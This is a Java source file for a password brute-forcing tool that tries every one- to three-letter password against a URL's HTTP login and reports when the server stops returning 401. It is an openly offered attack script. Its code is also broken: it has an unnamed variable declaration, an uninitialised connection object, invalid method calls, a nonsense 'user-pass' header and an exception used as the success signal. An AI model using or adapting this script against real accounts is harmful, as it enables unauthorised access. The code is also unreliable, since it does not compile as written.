import java.net.*;
import java.io.*;

public  class BruteForce
{
	public BruteForce(String u,String uname) throws Exception
	{
		String pass="";
		try
		{
			String []chr={"a","b","c","d","e","f","g","h","i","j",
					"k","l","m","n","o","p","q","r","s","t",
					"u","v","w","x","y","z","A","B","C","D",
					"E","F","G","H","I","J","K","L","M","N",
					"O","P","Q","R","S","T","U","V","W","X","Y","Z"};
			URL url=new URL(u);
			PasswordAuthentication pa;
			MyAuthenticator =new MyAuthenticator();
			HttpURLConnection h;
			int c=0;
			for(int i=1;i<=52;i++)
			{
				c++;
				pass=""+chr[i-1];
				pa=new PasswordAuthentication(uname,pass.toCharArray());
				h.setPasswordAuthentication(pa);
				Authenticator.setDefault();
				h=(HttpURLConnection)url.openConnection();
				h.setRequestProperty("user-pass",URLEncoder.encode(":"+pass));
System.out.println("Try :"+chr(c)+"      password:("+pass+") response message: ("+h.getResponseMessage()+")");
				if(h.getResponseCode() != 401)
					throw new NullPointerException();
				h.disconnect();
			}
			for(int i=52;i>=1;i--)
			{
				for(int j=1;j<=52;j++)
				{
					c++;
					pass=chr[i-1]+""+chr[j-1];
					pa=new PasswordAuthentication("",pass.toCharArray());
					h.setPasswordAuthentication(pa);
					Authenticator.setDefault();
					h=(HttpURLConnection)url.openConnection();
					h.setRequestProperty("user-pass",URLEncoder.encode(":"+pass));
System.out.println("Try :"+(c)+"      password:("+pass+") response message: ("+h.getResponseMessage()+")");
					if(h.getResponseCode() != 401)
						throw new NullPointerException();
					h.disconnect();
				}
			}
			for(int i=52;i>0;i--)
			{
				for(int j=0;j<26;j++)
				{
					for(int k=1;k<=52;k++)
					{
					c++;
					pass=chr[i-1]+""+chr[25-j]+""+chr[k-1];
					pa=new PasswordAuthentication("",pass.toCharArray());
					h.setPasswordAuthentication(pa);
					Authenticator.setDefault();
					h=(HttpURLConnection)url.openConnection();
					h.setRequestProperty("user-pass",URLEncoder.encode(":"+pass));
System.out.println("Try :"+(c)+"      password:("+pass+") response message: ("+h.getResponseMessage()+")");
					if(h.getResponseCode() != 401)
						throw new NullPointerException();
					h.disconnect();

					pass=chr[i-1]+""+chr[51-j]+""+chr[k-1];
					pa=new PasswordAuthentication("",pass.toCharArray());
					h.setPasswordAuthentication(pa);
					Authenticator.setDefault();
					h=(HttpURLConnection)url.openConnection();
					h.setRequestProperty("user-pass",URLEncoder.encode(":"+pass));
System.out.println("Try :"+(c)+"      password:("+pass+") response message: ("+h.getResponseMessage()+")");
					if(h.getResponseCode() != 401)
						throw new NullPointerException();
					h.disconnect();

					}
				}
			}
		}
		catch(NullPointerException great)
		{
			System.out.println("\n\n The password is cracked.\n The password is : "+pass);
		}
		catch(MalformedURLException mfe)
		{
			System.out.println("The URL :"+u+" is not a proper URL.");
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	public static void main(String[] args)  throws Exception
	{
		if(args.length!=2)
			System.out.println("Usage :\n java BruteForce <url> <user-name>");
		else
		{
			System.out.println("Starting the BruteForce Attack : "+args[0]);
			new BruteForce(args[0],args[1]);
		}
	}
}

